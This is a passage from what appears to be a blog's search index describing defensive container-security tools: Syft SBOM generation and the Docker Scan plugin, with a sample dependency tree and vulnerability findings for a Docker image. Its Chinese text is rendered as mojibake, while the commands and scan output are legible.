SBOM]]\nå‚è€ƒ\næ–‡æ¡£give-jenkins-a-software-bill-of-materials-with-syft&#x2F;\nDEMOjenkins-syft-demo\n\n0x06ä½¿ç”¨è¯´æ˜Generating SBOMTo generate an SBOM for a container image:\nsyft &lt;image&gt;\n# ä¸Šé¢çš„è¾“å‡ºåªåŒ…æ‹¬åœ¨å®¹å™¨ä¸­å¯è§çš„è½¯ä»¶(å³å›¾åƒçš„å‹ç¼©è¡¨ç¤º)ã€‚ä¸ºäº†åœ¨ SBOM ä¸­åŒ…å«æ¥è‡ªæ‰€æœ‰å›¾åƒå±‚çš„è½¯ä»¶ï¼Œä¸ç®¡å®ƒåœ¨æœ€ç»ˆå›¾åƒä¸­æ˜¯å¦å­˜åœ¨ï¼Œæ·»åŠ å‚æ•°å¦‚ä¸‹\nsyft &lt;image&gt; --scope all-layers\nSyft å¯¹ä¸åŒæ¥æºç”Ÿäº§SBOM\n# catalog a container image archive (from the result of &#96;docker image save ...&#96;, &#96;podman save ...&#96;, or &#96;skopeo copy&#96; commands)\nsyft path&#x2F;to&#x2F;image.tar\n# catalog a directory\nsyft path&#x2F;to&#x2F;dir\nSources can be explicitly provided with a scheme:\ndocker:yourrepo&#x2F;yourimage:tag            use images from the Docker daemon\npodman:yourrepo&#x2F;yourimage:tag            use images from the Podman daemon\ndocker-archive:path&#x2F;to&#x2F;yourimage.tar     use a tarball from disk for archives created from &quot;docker save&quot;\noci-archive:path&#x2F;to&#x2F;yourimage.tar        use a tarball from disk for OCI archives (from Skopeo or otherwise)\noci-dir:path&#x2F;to&#x2F;yourimage                read directly from a path on disk for OCI layout directories (from Skopeo or otherwise)\nsingularity:path&#x2F;to&#x2F;yourimage.sif        read directly from a Singularity Image Format (SIF) container on disk\ndir:path&#x2F;to&#x2F;yourproject                  read directly from a path on disk (any directory)\nfile:path&#x2F;to&#x2F;yourproject&#x2F;file            read directly from a path on disk (any single file)\nregistry:yourrepo&#x2F;yourimage:tag          pull image directly from a registry (no container runtime required)\noutput formatssyft &lt;image&gt; -o &lt;format&gt;\næ”¯æŒçš„æ ¼å¼\n\njson: Use this to get as much information out of Syft as possible!\ntext: A row-oriented, human-and-machine-friendly output.\ncyclonedx-xml: A XML report conforming to theÂ CycloneDX 1.4 specification.\ncyclonedx-json: A JSON report conforming to theÂ CycloneDX 1.4 specification.\nspdx-tag-value: A tag-value formatted report conforming to theÂ SPDX 2.2 specification.\nspdx-json: A JSON report conforming to theÂ SPDX 2.2 JSON Schema.\ngithub: A JSON report conforming to GitHubâ€™s dependency snapshot format.\ntable: A columnar summary (default).\ntemplate: Lets the user specify the output format. SeeÂ â€œUsing templatesâ€Â below.\n\nPrivate Registry AuthenticationLocal Docker Credentials\ndocker run -v .&#x2F;config.json:&#x2F;config&#x2F;config.json -e &quot;DOCKER_CONFIG&#x3D;&#x2F;config&quot; anchore&#x2F;syft:latest  &lt;private_image&gt;\nDocker Credentials in Kubernetes\ncreat secret# secret.yaml\n\napiVersion: v1\nkind: Secret\nmetadata:\n  name: registry-config\n  namespace: syft\ndata:\n  config.json: &lt;base64 encoded config.json&gt;\ncreat pod apiVersion: v1\nkind: Pod\nmetadata:\n  name: syft-k8s-usage\nspec:\n  containers:\n    - image: anchore&#x2F;syft:latest\n      name: syft-private-registry-demo\n      env:\n        - name: DOCKER_CONFIG\n          value: &#x2F;config\n      volumeMounts:\n      - mountPath: &#x2F;config\n        name: registry-config\n        readOnly: true\n      args:\n        - &lt;private_image&gt;\n  volumes:\n  - name: registry-config\n    secret:\n      secretName: registry-config\nThe user can now runÂ kubectl logs syft-private-registry-demo. The logs should show the Syft analysis for theÂ &lt;private_image&gt;Â provided in the pod configuration.\n\nå¯ä¿¡é•œåƒç•¥ï¼ˆæ”¯æŒï¼Œä½†å°šå±äºè¯•éªŒé˜¶æ®µï¼‰\n0x07åº”ç”¨åœºæ™¯\nå•ä¸€é•œåƒå®‰å…¨æ‰«æï¼Œç»è¿‡å®‰å…¨æ‰«æçš„é•œåƒä½œä¸ºå¯ä¿¡é•œåƒ\né•œåƒç”Ÿæˆè½¯ä»¶ä¾›åº”é“¾æ¸…å•\né›†æˆåˆ°CI&#x2F;CDä¸­æ¢³ç†å®¹å™¨é•œåƒä¸­çš„èµ„äº§ä¿¡æ¯ï¼ˆåŒ…æ‹¬åº”ç”¨ç¨‹åºçš„äºŒè¿›åˆ¶æ–‡ä»¶ä»¥åŠç¨‹åºçš„æ‰§è¡Œç¯å¢ƒå’Œä¾èµ–ã€‚ï¼‰ï¼šè½¯ä»¶ï¼ˆæ“ä½œç³»ç»ŸåŒ…ç®¡ç†å™¨å¦‚yumã€aptå’Œåº”ç”¨ç¨‹åºåŒ…ç®¡ç†å™¨mavenï¼‰ç‰ˆæœ¬ã€æ¼æ´ã€æœ€æ–°ç‰ˆã€é£é™©å€¼ç­‰ã€‚\n\n","slug":"syft","date":"2022-08-31T09:44:00.000Z","categories_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨","tags_index":"SCA,è½¯ä»¶ä¾›åº”é“¾å®‰å…¨,é•œåƒä¾èµ–åˆ†æ,docker-SBOM,å®¹å™¨é•œåƒå®‰å…¨","author_index":"Moses"},{"id":"e9d7711be30d2abb5d40d409afb44a29","title":"Dockeré•œåƒå®‰å…¨æ£€æŸ¥","content":"dockeré•œåƒå®‰å…¨çš„æ£€æŸ¥å®˜æ–¹å·¥å…·Docker ScanVulnerability scanning for Docker local images | Docker Documentation\ninstall\nubuntuapt-get update &amp;&amp; apt-get install docker-scan-plugin\ncentosyum install docker-scan-plugin\nmacDownload and install the latest version of Docker Desktop\n\nPrerequisites\nDocker Desktop\nsign into Docker Hub\nlogin Snky account\n\n\nUsage\n\n\nOption\nDescription\n\n\n\nâ€“accept-license\nAccept the license agreement of the third-party scanning provider\n\n\nâ€“dependency-tree\nDisplay the dependency tree of the image along with scan results\n\n\nâ€“exclude-base\nExclude the base image during scanning. This option requires the â€“file option to be set\n\n\n-f, â€“file string\nSpecify the location of the Dockerfile associated with the image. This option displays a detailed scan result\n\n\nâ€“json\nDisplay the result of the scan in JSON format\n\n\nâ€“login\nLog into Snyk using an optional token (using the flag â€“token), or by using a web-based token\n\n\nâ€“reject-license\nReject the license agreement of the third-party scanning provider\n\n\nâ€“severity string\nOnly report vulnerabilities of provided level or higher (low, medium, high)\n\n\nâ€“token string\nUse the authentication token to log into the third-party scanning provider\n\n\nâ€“version\nDisplay the Docker Scan plugin version\n\n\nç¤ºä¾‹\næ‰«æä¾èµ–æ ‘å¹¶ä¿å­˜æˆJSONæ–‡ä»¶âœ˜ xfxj01@moses î‚° ~&#x2F;Downloads&#x2F;swagger-ui-chrome î‚° î‚  master î‚° docker scan --json --dependency-tree pikachu:latest &gt; &#x2F;Users&#x2F;xfxj01&#x2F;Downloads&#x2F;pikachu.json\n xfxj01@moses î‚° ~&#x2F;Downloads&#x2F;PR&#x2F;deepflow-dashboards î‚° î‚  main î‚° docker scan --dependency-tree sspringett&#x2F;nvdmirror:latest\ndocker-image|sspringett&#x2F;nvdmirror @ latest\n   â”œâ”€ .httpd-so-deps @ 20220613.233641\n   â”‚  â”œâ”€ apr-util&#x2F;apr-util @ 1.6.1-r12\n   â”‚  â”œâ”€ apr&#x2F;apr @ 1.7.0-r2\n   â”‚  â”œâ”€ brotli&#x2F;brotli-libs @ 1.0.9-r6\n   â”‚  â”œâ”€ curl&#x2F;libcurl @ 7.83.1-r1\n   â”‚  â”œâ”€ jansson&#x2F;jansson @ 2.14-r0\n   â”‚  â”œâ”€ libxml2&#x2F;libxml2 @ 2.9.14-r0\n   â”‚  â”œâ”€ lua5.1&#x2F;lua5.1-libs @ 5.1.5-r11\n   â”‚  â”œâ”€ nghttp2&#x2F;nghttp2-libs @ 1.47.0-r0\n   â”‚  â”œâ”€ openldap&#x2F;libldap @ 2.6.2-r0\n   â”‚  â”œâ”€ openssl&#x2F;libcrypto1.1 @ 1.1.1o-r0\n   â”‚  â”œâ”€ openssl&#x2F;libssl1.1 @ 1.1.1o-r0\n   â”‚  â”œâ”€ pcre&#x2F;pcre @ 8.45-r2\n   â”‚  â””â”€ zlib&#x2F;zlib @ 1.2.12-r1\n   â”œâ”€ alpine-baselayout&#x2F;alpine-baselayout @ 3.2.0-r20\n   â”œâ”€ alpine-baselayout&#x2F;alpine-baselayout-data @ 3.2.0-r20\n   â”‚  â””â”€ alpine-baselayout&#x2F;alpine-baselayout @ 3.2.0-r20\n   â”‚     â””â”€ busybox&#x2F;busybox @ 1.35.0-r13\n   â”œâ”€ alpine-keys&#x2F;alpine-keys @ 2.4-r1\n   â”œâ”€ alsa-lib&#x2F;alsa-lib @ 1.2.6.1-r0\n   â”œâ”€ apk-tools&#x2F;apk-tools @ 2.12.9-r3\n   â”‚  â”œâ”€ ca-certificates&#x2F;ca-certificates-bundle @ 20211220-r0\n   â”‚  â”œâ”€ openssl&#x2F;libcrypto1.1 @ 1.1.1o-r0\n   â”‚  â”œâ”€ openssl&#x2F;libssl1.1 @ 1.1.1o-r0\n   â”‚  â””â”€ zlib&#x2F;zlib @ 1.2.12-r1\n   â”œâ”€ apr-util&#x2F;apr-util @ 1.6.1-r12\n   â”‚  â”œâ”€ apr&#x2F;apr @ 1.7.0-r2\n   â”‚  â”œâ”€ expat&#x2F;expat @ 2.4.8-r0\n   â”‚  â””â”€ openssl&#x2F;libcrypto1.1 @ 1.1.1o-r0\n   â”œâ”€ apr-util&#x2F;apr-util-ldap @ 1.6.1-r12\n   â”‚  â””â”€ openldap&#x2F;libldap @ 2.6.2-r0\n   â”œâ”€ apr&#x2F;apr @ 1.7.0-r2\n   â”‚  â””â”€ util-linux&#x2F;libuuid @ 2.38-r1\n   â”œâ”€ brotli&#x2F;brotli-libs @ 1.0.9-r6\n   â”œâ”€ busybox&#x2F;busybox @ 1.35.0-r13\n   â”œâ”€ busybox&#x2F;ssl_client @ 1.35.0-r13\n   â”‚  â”œâ”€ openssl&#x2F;libcrypto1.1 @ 1.1.1o-r0\n   â”‚  â””â”€ openssl&#x2F;libssl1.1 @ 1.1.1o-r0\n   â”œâ”€ bzip2&#x2F;libbz2 @ 1.0.8-r1\n   â”œâ”€ ca-certificates&#x2F;ca-certificates @ 20211220-r0\n   â”‚  â”œâ”€ busybox&#x2F;busybox @ 1.35.0-r13\n   â”‚  â””â”€ openssl&#x2F;libcrypto1.1 @ 1.1.1o-r0\n   â”œâ”€ ca-certificates&#x2F;ca-certificates-bundle @ 20211220-r0\n   â”œâ”€ curl&#x2F;libcurl @ 7.83.1-r1\n   â”‚  â”œâ”€ brotli&#x2F;brotli-libs @ 1.0.9-r6\n   â”‚  â”œâ”€ ca-certificates&#x2F;ca-certificates @ 20211220-r0\n   â”‚  â”œâ”€ nghttp2&#x2F;nghttp2-libs @ 1.47.0-r0\n   â”‚  â”œâ”€ openssl&#x2F;libcrypto1.1 @ 1.1.1o-r0\n   â”‚  â”œâ”€ openssl&#x2F;libssl1.1 @ 1.1.1o-r0\n   â”‚  â””â”€ zlib&#x2F;zlib @ 1.2.12-r1\n   â”œâ”€ cyrus-sasl&#x2F;libsasl @ 2.1.28-r0\n   â”‚  â””â”€ gdbm&#x2F;gdbm @ 1.23-r0\n   â”œâ”€ dcron&#x2F;dcron @ 4.5-r7\n   â”œâ”€ e2fsprogs&#x2F;libcom_err @ 1.46.5-r0\n   â”œâ”€ encodings&#x2F;encodings @ 1.0.5-r0\n   â”œâ”€ expat&#x2F;expat @ 2.4.8-r0\n   â”œâ”€ fontconfig&#x2F;fontconfig @ 2.14.0-r0\n   â”‚  â”œâ”€ busybox&#x2F;busybox @ 1.35.0-r13\n   â”‚  â”œâ”€ expat&#x2F;expat @ 2.4.8-r0\n   â”‚  â””â”€ freetype&#x2F;freetype @ 2.12.1-r0\n   â”œâ”€ freetype&#x2F;freetype @ 2.12.1-r0\n   â”‚  â”œâ”€ brotli&#x2F;brotli-libs @ 1.0.9-r6\n   â”‚  â”œâ”€ bzip2&#x2F;libbz2 @ 1.0.8-r1\n   â”‚  â”œâ”€ libpng&#x2F;libpng @ 1.6.37-r1\n   â”‚  â””â”€ zlib&#x2F;zlib @ 1.2.12-r1\n   â”œâ”€ gcc&#x2F;libgcc @ 11.2.1_git20220219-r2\n   â”‚  â””â”€ gcc&#x2F;libstdc++ @ 11.2.1_git20220219-r2\n   â”œâ”€ gcc&#x2F;libstdc++ @ 11.2.1_git20220219-r2\n   â”œâ”€ gdbm&#x2F;gdbm @ 1.23-r0\n   â”œâ”€ giflib&#x2F;giflib @ 5.2.1-r0\n   â”œâ”€ jansson&#x2F;jansson @ 2.14-r0\n   â”œâ”€ java-cacerts&#x2F;java-cacerts @ 1.0-r1\n   â”‚  â”œâ”€ busybox&#x2F;busybox @ 1.35.0-r13\n   â”‚  â”œâ”€ ca-certificates&#x2F;ca-certificates @ 20211220-r0\n   â”‚  â”œâ”€ p11-kit&#x2F;p11-kit @ 0.24.1-r0\n   â”‚  â””â”€ p11-kit&#x2F;p11-kit-trust @ 0.24.1-r0\n   â”œâ”€ java-common&#x2F;java-common @ 0.5-r0\n   â”‚  â””â”€ busybox&#x2F;busybox @ 1.35.0-r13\n   â”œâ”€ keyutils&#x2F;keyutils-libs @ 1.6.3-r1\n   â”œâ”€ krb5-conf&#x2F;krb5-conf @ 1.0-r2\n   â”‚  â””â”€ krb5&#x2F;krb5-libs @ 1.19.3-r0\n   â”‚     â”œâ”€ e2fsprogs&#x2F;libcom_err @ 1.46.5-r0\n   â”‚     â”œâ”€ keyutils&#x2F;keyutils-libs @ 1.6.3-r1\n   â”‚     â”œâ”€ libverto&#x2F;libverto @ 0.3.2-r0\n   â”‚     â”œâ”€ openssl&#x2F;libcrypto1.1 @ 1.1.1o-r0\n   â”‚     â””â”€ openssl&#x2F;libssl1.1 @ 1.1.1o-r0\n   â”œâ”€ krb5&#x2F;krb5-libs @ 1.19.3-r0\n   â”œâ”€ lcms2&#x2F;lcms2 @ 2.13.1-r0\n   â”œâ”€ libc-dev&#x2F;libc-utils @ 0.7.2-r3\n   â”‚  â””â”€ musl&#x2F;musl-utils @ 1.2.3-r0\n   â”œâ”€ libffi&#x2F;libffi @ 3.4.2-r1\n   â”œâ”€ libfontenc&#x2F;libfontenc @ 1.1.4-r0\n   â”‚  â””â”€ zlib&#x2F;zlib @ 1.2.12-r1\n   â”œâ”€ libjpeg-turbo&#x2F;libjpeg-turbo @ 2.1.3-r1\n   â”œâ”€ libpng&#x2F;libpng @ 1.6.37-r1\n   â”‚  â””â”€ zlib&#x2F;zlib @ 1.2.12-r1\n   â”œâ”€ libtasn1&#x2F;libtasn1 @ 4.18.0-r0\n   â”œâ”€ libverto&#x2F;libverto @ 0.3.2-r0\n   â”œâ”€ libx11&#x2F;libx11 @ 1.8-r0\n   â”‚  â””â”€ libxcb&#x2F;libxcb @ 1.15-r0\n   â”œâ”€ libxau&#x2F;libxau @ 1.0.9-r0\n   â”œâ”€ libxcb&#x2F;libxcb @ 1.15-r0\n   â”‚  â”œâ”€ libxau&#x2F;libxau @ 1.0.9-r0\n   â”‚  â””â”€ libxdmcp&#x2F;libxdmcp @ 1.1.3-r0\n   â”œâ”€ libxcomposite&#x2F;libxcomposite @ 0.4.5-r0\n   â”‚  â””â”€ libx11&#x2F;libx11 @ 1.8-r0\n   â”œâ”€ libxdmcp&#x2F;libxdmcp @ 1.1.3-r0\n   â”œâ”€ libxext&#x2F;libxext @ 1.3.4-r0\n   â”‚  â””â”€ libx11&#x2F;libx11 @ 1.8-r0\n   â”œâ”€ libxi&#x2F;libxi @ 1.8-r0\n   â”‚  â”œâ”€ libx11&#x2F;libx11 @ 1.8-r0\n   â”‚  â””â”€ libxext&#x2F;libxext @ 1.3.4-r0\n   â”œâ”€ libxml2&#x2F;libxml2 @ 2.9.14-r0\n   â”‚  â”œâ”€ xz&#x2F;xz-libs @ 5.2.5-r1\n   â”‚  â””â”€ zlib&#x2F;zlib @ 1.2.12-r1\n   â”œâ”€ libxrender&#x2F;libxrender @ 0.9.10-r3\n   â”‚  â””â”€ libx11&#x2F;libx11 @ 1.8-r0\n   â”œâ”€ libxtst&#x2F;libxtst @ 1.2.3-r3\n   â”‚  â”œâ”€ libx11&#x2F;libx11 @ 1.8-r0\n   â”‚  â””â”€ libxext&#x2F;libxext @ 1.3.4-r0\n   â”œâ”€ lksctp-tools&#x2F;liblksctp @ 1.0.19-r0\n   â”œâ”€ lua5.1&#x2F;lua5.1-libs @ 5.1.5-r11\n   â”œâ”€ meta-common-packages @ meta\n   â”‚  â””â”€ musl&#x2F;musl @ 1.2.3-r0\n   â”œâ”€ mkfontscale&#x2F;mkfontscale @ 1.2.2-r0\n   â”‚  â”œâ”€ busybox&#x2F;busybox @ 1.35.0-r13\n   â”‚  â”œâ”€ freetype&#x2F;freetype @ 2.12.1-r0\n   â”‚  â”œâ”€ libfontenc&#x2F;libfontenc @ 1.1.4-r0\n   â”‚  â””â”€ zlib&#x2F;zlib @ 1.2.12-r1\n   â”œâ”€ mpdecimal&#x2F;mpdecimal @ 2.5.1-r1\n   â”‚  â”œâ”€ gcc&#x2F;libgcc @ 11.2.1_git20220219-r2\n   â”‚  â””â”€ gcc&#x2F;libstdc++ @ 11.2.1_git20220219-r2\n   â”œâ”€ musl&#x2F;musl-utils @ 1.2.3-r0\n   â”‚  â””â”€ pax-utils&#x2F;scanelf @ 1.3.4-r0\n   â”œâ”€ ncurses&#x2F;ncurses-libs @ 6.3_p20220521-r0\n   â”‚  â””â”€ ncurses&#x2F;ncurses-terminfo-base @ 6.3_p20220521-r0\n   â”œâ”€ ncurses&#x2F;ncurses-terminfo-base @ 6.3_p20220521-r0\n   â”œâ”€ nghttp2&#x2F;nghttp2-libs @ 1.47.0-r0\n   â”œâ”€ nspr&#x2F;nspr @ 4.33-r0\n   â”œâ”€ nss&#x2F;nss @ 3.78.1-r0\n   â”‚  â”œâ”€ nspr&#x2F;nspr @ 4.33-r0\n   â”‚  â””â”€ sqlite&#x2F;sqlite-libs @ 3.38.5-r0\n   â”œâ”€ openjdk8&#x2F;openjdk8-jre @ 8.322.06-r0\n   â”‚  â”œâ”€ alsa-lib&#x2F;alsa-lib @ 1.2.6.1-r0\n   â”‚  â”œâ”€ freetype&#x2F;freetype @ 2.12.1-r0\n   â”‚  â”œâ”€ gcc&#x2F;libgcc @ 11.2.1_git20220219-r2\n   â”‚  â”œâ”€ gcc&#x2F;libstdc++ @ 11.2.1_git20220219-r2\n   â”‚  â”œâ”€ giflib&#x2F;giflib @ 5.2.1-r0\n   â”‚  â”œâ”€ libjpeg-turbo&#x2F;libjpeg-turbo @ 2.1.3-r1\n   â”‚  â”œâ”€ libpng&#x2F;libpng @ 1.6.37-r1\n   â”‚  â”œâ”€ libx11&#x2F;libx11 @ 1.8-r0\n   â”‚  â”œâ”€ libxcomposite&#x2F;libxcomposite @ 0.4.5-r0\n   â”‚  â”œâ”€ libxext&#x2F;libxext @ 1.3.4-r0\n   â”‚  â”œâ”€ libxi&#x2F;libxi @ 1.8-r0\n   â”‚  â”œâ”€ libxrender&#x2F;libxrender @ 0.9.10-r3\n   â”‚  â”œâ”€ libxtst&#x2F;libxtst @ 1.2.3-r3\n   â”‚  â”œâ”€ openjdk8&#x2F;openjdk8-jre-base @ 8.322.06-r0\n   â”‚  â””â”€ ttf-dejavu&#x2F;ttf-dejavu @ 2.37-r1\n   â”œâ”€ openjdk8&#x2F;openjdk8-jre-base @ 8.322.06-r0\n   â”‚  â”œâ”€ gcc&#x2F;libstdc++ @ 11.2.1_git20220219-r2\n   â”‚  â”œâ”€ java-cacerts&#x2F;java-cacerts @ 1.0-r1\n   â”‚  â”œâ”€ java-common&#x2F;java-common @ 0.5-r0\n   â”‚  â”œâ”€ krb5&#x2F;krb5-libs @ 1.19.3-r0\n   â”‚  â”œâ”€ lcms2&#x2F;lcms2 @ 2.13.1-r0\n   â”‚  â”œâ”€ libjpeg-turbo&#x2F;libjpeg-turbo @ 2.1.3-r1\n   â”‚  â”œâ”€ lksctp-tools&#x2F;liblksctp @ 1.0.19-r0\n   â”‚  â”œâ”€ nss&#x2F;nss @ 3.78.1-r0\n   â”‚  â”œâ”€ openjdk8&#x2F;openjdk8-jre-lib @ 8.322.06-r0\n   â”‚  â”œâ”€ pcsc-lite&#x2F;pcsc-lite-libs @ 1.9.6-r0\n   â”‚  â””â”€ zlib&#x2F;zlib @ 1.2.12-r1\n   â”œâ”€ openjdk8&#x2F;openjdk8-jre-lib @ 8.322.06-r0\n   â”œâ”€ openldap&#x2F;libldap @ 2.6.2-r0\n   â”‚  â”œâ”€ cyrus-sasl&#x2F;libsasl @ 2.1.28-r0\n   â”‚  â”œâ”€ openssl&#x2F;libcrypto1.1 @ 1.1.1o-r0\n   â”‚  â””â”€ openssl&#x2F;libssl1.1 @ 1.1.1o-r0\n   â”œâ”€ openssl&#x2F;libcrypto1.1 @ 1.1.1o-r0\n   â”œâ”€ openssl&#x2F;libssl1.1 @ 1.1.1o-r0\n   â”‚  â””â”€ openssl&#x2F;libcrypto1.1 @ 1.1.1o-r0\n   â”œâ”€ p11-kit&#x2F;p11-kit @ 0.24.1-r0\n   â”‚  â””â”€ libffi&#x2F;libffi @ 3.4.2-r1\n   â”œâ”€ p11-kit&#x2F;p11-kit-trust @ 0.24.1-r0\n   â”‚  â”œâ”€ libtasn1&#x2F;libtasn1 @ 4.18.0-r0\n   â”‚  â””â”€ p11-kit&#x2F;p11-kit @ 0.24.1-r0\n   â”œâ”€ pax-utils&#x2F;scanelf @ 1.3.4-r0\n   â”œâ”€ pcre&#x2F;pcre @ 8.45-r2\n   â”œâ”€ pcsc-lite&#x2F;pcsc-lite-libs @ 1.9.6-r0\n   â”œâ”€ perl&#x2F;perl @ 5.34.1-r0\n   â”‚  â”œâ”€ bzip2&#x2F;libbz2 @ 1.0.8-r1\n   â”‚  â””â”€ zlib&#x2F;zlib @ 1.2.12-r1\n   â”œâ”€ py3-appdirs&#x2F;py3-appdirs @ 1.4.4-r3\n   â”‚  â””â”€ python3&#x2F;python3 @ 3.10.4-r0\n   â”œâ”€ py3-more-itertools&#x2F;py3-more-itertools @ 8.13.0-r0\n   â”‚  â””â”€ python3&#x2F;python3 @ 3.10.4-r0\n   â”œâ”€ py3-ordered-set&#x2F;py3-ordered-set @ 4.0.2-r3\n   â”‚  â””â”€ python3&#x2F;python3 @ 3.10.4-r0\n   â”œâ”€ py3-packaging&#x2F;py3-packaging @ 21.3-r0\n   â”‚  â”œâ”€ py3-parsing&#x2F;py3-parsing @ 2.4.7-r3\n   â”‚  â”œâ”€ py3-six&#x2F;py3-six @ 1.16.0-r1\n   â”‚  â””â”€ python3&#x2F;python3 @ 3.10.4-r0\n   â”œâ”€ py3-parsing&#x2F;py3-parsing @ 2.4.7-r3\n   â”‚  â””â”€ python3&#x2F;python3 @ 3.10.4-r0\n   â”œâ”€ py3-setuptools&#x2F;py3-setuptools @ 59.4.0-r0\n   â”‚  â”œâ”€ py3-appdirs&#x2F;py3-appdirs @ 1.4.4-r3\n   â”‚  â”œâ”€ py3-more-itertools&#x2F;py3-more-itertools @ 8.13.0-r0\n   â”‚  â”œâ”€ py3-ordered-set&#x2F;py3-ordered-set @ 4.0.2-r3\n   â”‚  â”œâ”€ py3-packaging&#x2F;py3-packaging @ 21.3-r0\n   â”‚  â”œâ”€ py3-parsing&#x2F;py3-parsing @ 2.4.7-r3\n   â”‚  â””â”€ python3&#x2F;python3 @ 3.10.4-r0\n   â”œâ”€ py3-six&#x2F;py3-six @ 1.16.0-r1\n   â”‚  â””â”€ python3&#x2F;python3 @ 3.10.4-r0\n   â”œâ”€ python3&#x2F;python3 @ 3.10.4-r0\n   â”‚  â”œâ”€ bzip2&#x2F;libbz2 @ 1.0.8-r1\n   â”‚  â”œâ”€ expat&#x2F;expat @ 2.4.8-r0\n   â”‚  â”œâ”€ gdbm&#x2F;gdbm @ 1.23-r0\n   â”‚  â”œâ”€ libffi&#x2F;libffi @ 3.4.2-r1\n   â”‚  â”œâ”€ mpdecimal&#x2F;mpdecimal @ 2.5.1-r1\n   â”‚  â”œâ”€ ncurses&#x2F;ncurses-libs @ 6.3_p20220521-r0\n   â”‚  â”œâ”€ openssl&#x2F;libcrypto1.1 @ 1.1.1o-r0\n   â”‚  â”œâ”€ openssl&#x2F;libssl1.1 @ 1.1.1o-r0\n   â”‚  â”œâ”€ readline&#x2F;readline @ 8.1.2-r0\n   â”‚  â”œâ”€ sqlite&#x2F;sqlite-libs @ 3.38.5-r0\n   â”‚  â”œâ”€ xz&#x2F;xz-libs @ 5.2.5-r1\n   â”‚  â””â”€ zlib&#x2F;zlib @ 1.2.12-r1\n   â”œâ”€ readline&#x2F;readline @ 8.1.2-r0\n   â”‚  â””â”€ ncurses&#x2F;ncurses-libs @ 6.3_p20220521-r0\n   â”œâ”€ sqlite&#x2F;sqlite-libs @ 3.38.5-r0\n   â”œâ”€ supervisor&#x2F;supervisor @ 4.2.4-r0\n   â”‚  â”œâ”€ py3-setuptools&#x2F;py3-setuptools @ 59.4.0-r0\n   â”‚  â””â”€ python3&#x2F;python3 @ 3.10.4-r0\n   â”œâ”€ ttf-dejavu&#x2F;ttf-dejavu @ 2.37-r1\n   â”‚  â”œâ”€ encodings&#x2F;encodings @ 1.0.5-r0\n   â”‚  â”œâ”€ fontconfig&#x2F;fontconfig @ 2.14.0-r0\n   â”‚  â””â”€ mkfontscale&#x2F;mkfontscale @ 1.2.2-r0\n   â”œâ”€ util-linux&#x2F;libuuid @ 2.38-r1\n   â”œâ”€ xz&#x2F;xz-libs @ 5.2.5-r1\n   â””â”€ zlib&#x2F;zlib @ 1.2.12-r1\nsspringett&#x2F;nvdmirror:latest:&#x2F;usr&#x2F;local&#x2F;bin @\n   â””â”€ us.springett:nist-data-mirror @ 1.6.1-SNAPSHOT\n\nTesting sspringett&#x2F;nvdmirror:latest...\n\nâœ— Low severity vulnerability found in openjdk8&#x2F;openjdk8-jre-base\n  Description: CVE-2022-21443\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-OPENJDK8-2987667\n  Introduced through: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0, openjdk8&#x2F;openjdk8-jre@8.322.06-r0, openjdk8&#x2F;openjdk8-jre-lib@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0 &gt; openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0\n  and 2 more...\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 8.345.01-r0\n\nâœ— Low severity vulnerability found in libxml2&#x2F;libxml2\n  Description: CVE-2022-3209\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-LIBXML2-2987456\n  Introduced through: libxml2&#x2F;libxml2@2.9.14-r0, .httpd-so-deps@20220613.233641\n  From: libxml2&#x2F;libxml2@2.9.14-r0\n  From: .httpd-so-deps@20220613.233641 &gt; libxml2&#x2F;libxml2@2.9.14-r0\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 2.9.14-r1\n\nâœ— Medium severity vulnerability found in openssl&#x2F;libcrypto1.1\n  Description: Inadequate Encryption Strength\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-OPENSSL-2941806\n  Introduced through: openssl&#x2F;libcrypto1.1@1.1.1o-r0, apr-util&#x2F;apr-util@1.6.1-r12, curl&#x2F;libcurl@7.83.1-r1, openldap&#x2F;libldap@2.6.2-r0, openssl&#x2F;libssl1.1@1.1.1o-r0, .httpd-so-deps@20220613.233641, apk-tools&#x2F;apk-tools@2.12.9-r3, busybox&#x2F;ssl_client@1.35.0-r13, ca-certificates&#x2F;ca-certificates@20211220-r0, python3&#x2F;python3@3.10.4-r0, krb5-conf&#x2F;krb5-conf@1.0-r2\n  From: openssl&#x2F;libcrypto1.1@1.1.1o-r0\n  From: apr-util&#x2F;apr-util@1.6.1-r12 &gt; openssl&#x2F;libcrypto1.1@1.1.1o-r0\n  From: curl&#x2F;libcurl@7.83.1-r1 &gt; openssl&#x2F;libcrypto1.1@1.1.1o-r0\n  and 16 more...\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 1.1.1q-r0\n\nâœ— Medium severity vulnerability found in openjdk8&#x2F;openjdk8-jre-base\n  Description: CVE-2022-21496\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-OPENJDK8-2987663\n  Introduced through: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0, openjdk8&#x2F;openjdk8-jre@8.322.06-r0, openjdk8&#x2F;openjdk8-jre-lib@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0 &gt; openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0\n  and 2 more...\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 8.345.01-r0\n\nâœ— Medium severity vulnerability found in openjdk8&#x2F;openjdk8-jre-base\n  Description: CVE-2022-21540\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-OPENJDK8-2987665\n  Introduced through: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0, openjdk8&#x2F;openjdk8-jre@8.322.06-r0, 